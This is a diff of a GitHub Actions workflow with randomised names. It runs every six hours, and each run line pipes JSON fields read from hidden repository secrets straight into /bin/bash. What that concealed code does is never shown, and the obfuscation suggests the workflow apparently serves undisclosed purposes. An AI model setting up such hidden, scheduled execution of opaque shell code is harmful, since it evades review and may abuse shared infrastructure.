@@ -1,21 +1,20 @@
 name: caocao19870106
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 1/6 * * *'
+    - cron: '49 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: caocao19870106
         env:
-          xal990: ${{ secrets.xal990 }}
+          f497: ${{ secrets.f497 }}
         run: |
-          echo $xal990 | jq -r .s60090 | /bin/bash
-          echo $db7599 | jq -r .bbxzw25968 | /bin/bash
-          echo $ddqdj0356 | jq -r .x7346 | /bin/bash
-          echo $ls7743 | jq -r .pm65378 | /bin/bash
-          echo $uf3 | jq -r .obeyz5237 | /bin/bash
+          echo $f497 | jq -r .zv942 | /bin/bash
+          echo $uni7 | jq -r .tvh203 | /bin/bash
+          echo $rvyuo54 | jq -r .i5 | /bin/bash
+          echo $masut3459 | jq -r .bmj44 | /bin/bash
 
